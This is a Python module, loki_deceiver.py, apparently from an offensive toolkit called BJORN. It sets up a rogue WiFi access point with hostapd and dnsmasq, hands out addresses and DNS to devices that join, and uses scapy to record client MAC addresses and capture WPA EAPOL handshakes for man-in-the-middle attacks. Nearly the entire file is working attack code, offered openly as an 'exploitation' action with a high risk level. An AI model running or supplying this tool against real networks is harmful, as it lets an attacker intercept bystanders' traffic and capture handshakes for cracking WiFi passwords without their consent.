#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
loki_deceiver.py -- WiFi deception tool for BJORN.
Creates rogue access points and captures authentications/handshakes.
Requires: hostapd, dnsmasq, airmon-ng.
"""

import os
import json
import subprocess
import threading
import time
import re
import tempfile
import datetime

from typing import Any, Dict, List, Optional

from logger import Logger
try:
    import scapy.all as scapy
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
    HAS_SCAPY = True
    try:
        from scapy.all import AsyncSniffer  # type: ignore
    except Exception:
        AsyncSniffer = None
    try:
        from scapy.layers.dot11 import EAPOL
    except ImportError:
        EAPOL = None
except ImportError:
    HAS_SCAPY = False
    scapy = None
    Dot11 = Dot11Beacon = Dot11Elt = EAPOL = None
    AsyncSniffer = None

logger = Logger(name="loki_deceiver.py")

# -------------------- Action metadata --------------------
b_class       = "LokiDeceiver"
b_module      = "loki_deceiver"
b_status      = "loki_deceiver"
b_port        = None
b_service     = "[]"
b_trigger     = "on_start"
b_parent      = None
b_action      = "aggressive"
b_priority    = 20
b_cooldown    = 0
b_rate_limit  = None
b_timeout     = 1200
b_max_retries = 1
b_stealth_level = 2  # Very noisy (Rogue AP)
b_risk_level  = "high"
b_enabled     = 1
b_tags        = ["wifi", "ap", "rogue", "mitm"]
b_category    = "exploitation"
b_name        = "Loki Deceiver"
b_description = "Creates a rogue access point to capture WiFi authentications and perform MITM."
b_author      = "Bjorn Team"
b_version     = "2.0.2"
b_icon        = "LokiDeceiver.png"

b_args = {
    "interface": {
        "type": "text", 
        "label": "Wireless Interface", 
        "default": "wlan0"
    },
    "ssid": {
        "type": "text", 
        "label": "AP SSID", 
        "default": "Bjorn_Free_WiFi"
    },
    "channel": {
        "type": "number", 
        "label": "Channel", 
        "min": 1, 
        "max": 14, 
        "default": 6
    },
    "password": {
        "type": "text", 
        "label": "WPA2 Password (Optional)", 
        "default": ""
    }
}

class LokiDeceiver:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.hostapd_proc = None
        self.dnsmasq_proc = None
        self.tcpdump_proc = None
        self._sniffer = None
        self.active_clients = set()
        self.stop_event = threading.Event()
        self.lock = threading.Lock()

    def _setup_monitor_mode(self, iface: str):
        logger.info(f"LokiDeceiver: Setting {iface} to monitor mode...")
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], capture_output=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'down'], capture_output=True)
        subprocess.run(['sudo', 'iw', iface, 'set', 'type', 'monitor'], capture_output=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'], capture_output=True)

    def _create_configs(self, iface, ssid, channel, password):
        # hostapd.conf
        h_conf = [
            f'interface={iface}',
            'driver=nl80211',
            f'ssid={ssid}',
            'hw_mode=g',
            f'channel={channel}',
            'macaddr_acl=0',
            'ignore_broadcast_ssid=0'
        ]
        if password:
            h_conf.extend([
                'auth_algs=1',
                'wpa=2',
                f'wpa_passphrase={password}',
                'wpa_key_mgmt=WPA-PSK',
                'wpa_pairwise=CCMP',
                'rsn_pairwise=CCMP'
            ])
        
        h_path = os.path.join(tempfile.gettempdir(), 'bjorn_hostapd.conf')
        with open(h_path, 'w') as f:
            f.write('\n'.join(h_conf))

        # dnsmasq.conf
        d_conf = [
            f'interface={iface}',
            'dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h',
            'dhcp-option=3,192.168.1.1',
            'dhcp-option=6,192.168.1.1',
            'server=8.8.8.8',
            'log-queries',
            'log-dhcp'
        ]
        d_path = os.path.join(tempfile.gettempdir(), 'bjorn_dnsmasq.conf')
        with open(d_path, 'w') as f:
            f.write('\n'.join(d_conf))
        
        return h_path, d_path

    def _packet_callback(self, packet):
        if self.shared_data.orchestrator_should_exit:
            return

        if packet.haslayer(Dot11):
            addr2 = packet.addr2 # Source MAC
            if addr2 and addr2 not in self.active_clients:
                # Association request or Auth
                if packet.type == 0 and packet.subtype in [0, 11]:
                    with self.lock:
                        self.active_clients.add(addr2)
                    logger.success(f"LokiDeceiver: New client detected: {addr2}")
                    self.shared_data.log_milestone(b_class, "ClientConnected", f"MAC: {addr2}")
            
            if EAPOL and packet.haslayer(EAPOL):
                logger.success(f"LokiDeceiver: EAPOL packet captured from {addr2}")
                self.shared_data.log_milestone(b_class, "Handshake", f"EAPOL from {addr2}")

    def execute(self, ip, port, row, status_key) -> str:
        iface = getattr(self.shared_data, "loki_deceiver_interface", "wlan0")
        ssid = getattr(self.shared_data, "loki_deceiver_ssid", "Bjorn_AP")
        channel = int(getattr(self.shared_data, "loki_deceiver_channel", 6))
        password = getattr(self.shared_data, "loki_deceiver_password", "")
        timeout = int(getattr(self.shared_data, "loki_deceiver_timeout", 600))
        _fallback_dir = os.path.join(getattr(self.shared_data, "data_dir", "/home/bjorn/Bjorn/data"), "output", "wifi")
        output_dir = getattr(self.shared_data, "loki_deceiver_output", _fallback_dir)

        # Reset per-run state
        self.active_clients.clear()

        logger.info(f"LokiDeceiver: Starting Rogue AP '{ssid}' on {iface}")
        self.shared_data.log_milestone(b_class, "Startup", f"Creating AP: {ssid}")
        # EPD live status
        self.shared_data.comment_params = {"ssid": ssid, "iface": iface, "channel": str(channel)}

        try:
            self.stop_event.clear()
            # self._setup_monitor_mode(iface) # Optional depending on driver
            h_path, d_path = self._create_configs(iface, ssid, channel, password)
            
            # Set IP for interface
            subprocess.run(['sudo', 'ip', 'addr', 'add', '192.168.1.1/24', 'dev', iface], capture_output=True)
            subprocess.run(['sudo', 'ip', 'link', 'set', iface, 'up'], capture_output=True)

            # Start processes
            # Use DEVNULL to avoid blocking on unread PIPE buffers.
            self.hostapd_proc = subprocess.Popen(
                ['sudo', 'hostapd', h_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            self.dnsmasq_proc = subprocess.Popen(
                ['sudo', 'dnsmasq', '-C', d_path, '-k'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            
            # Start sniffer (must be stoppable to avoid leaking daemon threads).
            if HAS_SCAPY and scapy and AsyncSniffer:
                try:
                    self._sniffer = AsyncSniffer(iface=iface, prn=self._packet_callback, store=False)
                    self._sniffer.start()
                except Exception as sn_e:
                    logger.warning(f"LokiDeceiver: sniffer start failed: {sn_e}")
                    self._sniffer = None

            start_time = time.time()
            while time.time() - start_time < timeout:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("LokiDeceiver: Interrupted by orchestrator.")
                    return "interrupted"

                # Check if procs still alive
                if self.hostapd_proc.poll() is not None:
                    logger.error("LokiDeceiver: hostapd crashed.")
                    break
                
                # Progress report
                elapsed = int(time.time() - start_time)
                prog = int((elapsed / timeout) * 100)
                self.shared_data.bjorn_progress = f"{prog}%"
                # EPD live status update
                self.shared_data.comment_params = {"ssid": ssid, "clients": str(len(self.active_clients)), "uptime": str(elapsed)}

                if elapsed % 60 == 0:
                    self.shared_data.log_milestone(b_class, "Status", f"Uptime: {elapsed}s | Clients: {len(self.active_clients)}")
                
                time.sleep(2)

            logger.info("LokiDeceiver: Stopping AP.")
            self.shared_data.log_milestone(b_class, "Shutdown", "Stopping Rogue AP")

        except Exception as e:
            logger.error(f"LokiDeceiver error: {e}")
            return "failed"
        finally:
            self.stop_event.set()
            if self._sniffer is not None:
                try:
                    self._sniffer.stop()
                except Exception:
                    pass
                self._sniffer = None

            # Cleanup
            for p in [self.hostapd_proc, self.dnsmasq_proc]:
                if p:
                    try: p.terminate(); p.wait(timeout=5)
                    except Exception: pass
            
            # Restore NetworkManager if needed (custom logic based on usage)
            # subprocess.run(['sudo', 'systemctl', 'start', 'NetworkManager'], capture_output=True)
            self.shared_data.bjorn_progress = ""
            self.shared_data.comment_params = {}

        return "success"

if __name__ == "__main__":
    from init_shared import shared_data
    loki = LokiDeceiver(shared_data)
    loki.execute("0.0.0.0", None, {}, "loki_deceiver")
